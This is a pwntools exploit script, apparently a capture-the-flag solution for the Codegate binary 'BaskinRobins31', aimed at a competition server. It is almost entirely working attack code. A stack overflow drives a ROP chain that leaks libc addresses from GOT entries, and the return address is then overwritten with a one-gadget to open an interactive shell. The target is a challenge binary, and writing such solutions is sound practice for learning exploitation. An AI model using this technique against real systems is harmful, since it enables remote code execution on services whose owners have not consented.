#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './BaskinRobins31'
binary = ELF("BaskinRobins31")
#libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name

remote_server = 'ch41l3ng3s.codegate.kr'
PORT = 3131

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)
else:
    p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# USEFUL FUNCTIONS
def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(x, y):
    x = p32(binary.symbols[y])
    # Example: read_got = p32(binary.symbols["read"])

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    #stack_ret_addr: 0x7ffc673f7888
    WRITE_PLT = 0x4006d0
    WRITE_CALL = 0x400910
    HELPER = 0x400876
    PRINTF_PLT = 0x4006e0
    PRINTF_GOT = 0x602030
    READ_GOT = 0x00602040
    SYSTEM_OFFSET =  0x045390
    EXECVE_OFFSET = 0xcc770
    ROP = 0x00400bc3
    MOV_EAX = 0x00400b54 #mov eax, 0


    data = p.recvuntil('\n')
    print data
    payload = 'A'*(0xb8 - 8)
    payload += p64(1) #arg1 -- FD
    payload += p64(HELPER)
    payload += p64(PRINTF_GOT) #arg2 -- BUF
    payload += p64(0xb9) #arg3 -- LEN
    #payload += 'XXXXXXXX'
    payload += p64(WRITE_PLT)
    #print payload
    p.sendline(payload)

    data = p.recvuntil(':(')
    data = p.recvline()
    data = p.recvline()
    print '\n>>>>>>>> \n' + data[0:8] + '>>>>>>>> ', hex(u64(data[0:8])), '\n'
    PRINTF_LIBC = hex(u64(data[0:8]))
    LIBC = hex(int(PRINTF_LIBC, 16) - 0x55800)
    print 'LIBC= ', LIBC
    # -------------------------------------------------------------------------------- First Input
    payload = 'A'*(0xb8 - 8)
    payload += p64(1) #arg1 -- FD
    payload += p64(HELPER)
    payload += p64(READ_GOT) #arg2 -- BUF
    payload += p64(0xb9) #arg3 -- LEN
    #payload += 'XXXXXXXX'
    payload += p64(WRITE_PLT)
    #print payload
    p.sendline(payload)

    data = p.recvuntil(':(')
    data = p.recvline()
    data = p.recvline()
    print '\n>>>>>>>> \n' + data[0:8] + '>>>>>>>> ', hex(u64(data[0:8])), '\n'
    PRINTF_LIBC = hex(u64(data[0:8]))
    # -------------------------------------------------------------------------------- Second Input
    SYSTEM_LIBC = hex(int(LIBC, 16) + SYSTEM_OFFSET)
    print " SYSTEM= ", SYSTEM_LIBC
    payload = 'A'*(0xb8)
    #payload += '/bin/sh ' #arg1 -- FD
    #payload += p64(MOV_EAX)
    ONE_SHOT = hex(int(LIBC, 16) + 0x45216)
    payload += p64(int(ONE_SHOT, 16))
    #payload += p64(0)
    #payload += p64(0) #arg1 -- FD
    #payload += p64(0) #arg3 -- LEN
    #payload += p64(0)
    #payload += 'XXXXXXXX'
    #payload += p64(int(SYSTEM_LIBC,16))
    #payload += p64(0x400a4b)
    #print payload
    p.sendline(payload)

    data = p.recvuntil(':(')
    data = p.recvline()
    print data
    # -------------------------------------------------------------------------------- Second Input


    p.interactive()
